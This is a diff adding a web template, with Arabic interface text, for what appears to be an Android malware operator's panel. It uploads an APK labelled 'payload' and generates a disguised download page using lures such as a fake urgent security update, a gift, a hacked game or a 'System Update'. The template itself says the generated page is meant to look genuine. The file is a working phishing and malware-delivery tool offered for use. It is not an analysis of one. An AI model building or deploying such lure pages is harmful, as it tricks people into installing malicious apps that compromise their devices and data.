@@ -1,0 +1,121 @@
+{% extends "base.html" %}{% set active='payload' %}
+{% block content %}
+<style>
+  .lure-card { text-align:center; padding:30px 20px; border-radius:15px; margin-bottom:20px; }
+  .lure-icon { font-size:70px; margin-bottom:15px; }
+  .lure-title { font-size:24px; font-weight:bold; margin-bottom:10px; }
+  .lure-desc { font-size:14px; color:#ccc; margin-bottom:25px; }
+  .download-btn { display:inline-block; padding:15px 40px; border-radius:10px; font-size:18px; font-weight:bold; text-decoration:none; color:#000; }
+  .select-box { width:100%; padding:12px; background:#000; color:#0f0; border:1px solid #333; border-radius:8px; margin-top:10px; font-size:15px; }
+  .generate-btn { width:100%; padding:12px; background:#ff8800; color:#000; border:none; border-radius:8px; margin-top:10px; font-weight:bold; font-size:15px; }
+  .upload-btn { width:100%; padding:12px; background:#0088cc; color:white; border:none; border-radius:8px; margin-top:10px; font-weight:bold; font-size:15px; cursor:pointer; }
+  input[type="file"] { width:100%; padding:10px; background:#000; color:#0f0; border:1px solid #333; border-radius:8px; margin-top:10px; }
+  .status { margin-top:10px; padding:10px; border-radius:5px; font-size:13px; display:none; }
+  .status-success { background:#003300; border:1px solid #0f0; color:#0f0; }
+  .status-error { background:#330000; border:1px solid #f00; color:#f00; }
+</style>
+
+<div class="card">
+  <h3 style="color:#ff8800;">🎭 مولد صفحات التحميل المموهة</h3>
+  <p style="color:#aaa; font-size:13px;">اختر نوع الطعم، وسيتم توليد صفحة تحميل احترافية تبدو حقيقية.</p>
+  
+  <label style="display:block; margin-top:15px; color:#aaa;">1. اختر ملف APK من هاتفك:</label>
+  <input type="file" id="apkFile" accept=".apk">
+  <button class="upload-btn" onclick="uploadAPK()">⬆️ رفع التطبيق</button>
+  <div id="uploadStatus" class="status"></div>
+  
+  <label style="display:block; margin-top:15px; color:#aaa;">2. نوع الطعم:</label>
+  <select id="lureType" class="select-box">
+    <option value="security">🛡️ تحديث أمني عاجل</option>
+    <option value="gift">🎁 مكافأة / هدية</option>
+    <option value="game">🎮 لعبة مهكرة</option>
+    <option value="update">📱 تحديث النظام</option>
+  </select>
+  
+  <label style="display:block; margin-top:10px; color:#aaa;">3. اسم التطبيق (يظهر للمستخدم):</label>
+  <input type="text" id="appName" value="System Update" class="select-box">
+  
+  <button class="generate-btn" onclick="generatePage()">🎭 توليد الصفحة المموهة</button>
+</div>
+
+<div id="fakePageResult" style="display:none;">
+  <div class="card" id="lureCard">
+    <div class="lure-icon" id="lureIcon">🛡️</div>
+    <div class="lure-title" id="lureTitle">تحديث أمني</div>
+    <div class="lure-desc" id="lureDesc">تحميل التحديث...</div>
+    <a href="#" id="downloadBtn" class="download-btn">📥 تحميل الآن</a>
+    <p style="margin-top:20px; font-size:11px; color:#666;">محتوى محمي بحقوق النشر - FALCON Security</p>
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+async function uploadAPK() {
+    const fileInput = document.getElementById("apkFile");
+    const status = document.getElementById("uploadStatus");
+    status.style.display = "block";
+    
+    if(!fileInput.files.length) {
+        status.className = "status status-error";
+        status.textContent = "❌ اختر ملف APK أولاً";
+        return;
+    }
+    
+    status.className = "status";
+    status.textContent = "⏳ جاري الرفع...";
+    
+    const formData = new FormData();
+    formData.append("payload", fileInput.files[0]);
+    
+    try {
+        const res = await fetch("/api/upload_payload", { method: "POST", body: formData });
+        const data = await res.json();
+        
+        if(data.success) {
+            status.className = "status status-success";
+            status.textContent = "✅ " + data.message;
+        } else {
+            status.className = "status status-error";
+            status.textContent = "❌ " + data.message;
+        }
+    } catch(e) {
+        status.className = "status status-error";
+        status.textContent = "❌ خطأ في الاتصال";
+    }
+}
+
+async function generatePage() {
+    const lureType = document.getElementById("lureType").value;
+    const appName = document.getElementById("appName").value;
+    
+    try {
+        const res = await fetch("/api/fake_download/generate", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({lure_type: lureType, app_name: appName})
+        });
+        const data = await res.json();
+        
+        if(data.success) {
+            document.getElementById("fakePageResult").style.display = "block";
+            document.getElementById("lureCard").style.background = `linear-gradient(145deg, #1a1a1a, #0a0a0a)`;
+            document.getElementById("lureCard").style.border = `2px solid ${data.color}`;
+            document.getElementById("lureIcon").textContent = data.icon;
+            document.getElementById("lureTitle").textContent = data.title;
+            document.getElementById("lureTitle").style.color = data.color;
+            document.getElementById("lureDesc").textContent = data.description;
+            
+            const btn = document.getElementById("downloadBtn");
+            btn.style.background = data.color;
+            btn.href = "/download_page";
+            btn.textContent = `📥 تحميل ${data.app_name}`;
+        } else {
+            alert("❌ " + data.message);
+        }
+    } catch(e) {
+        alert("❌ خطأ في الاتصال");
+    }
+}
+</script>
+{% endblock %}
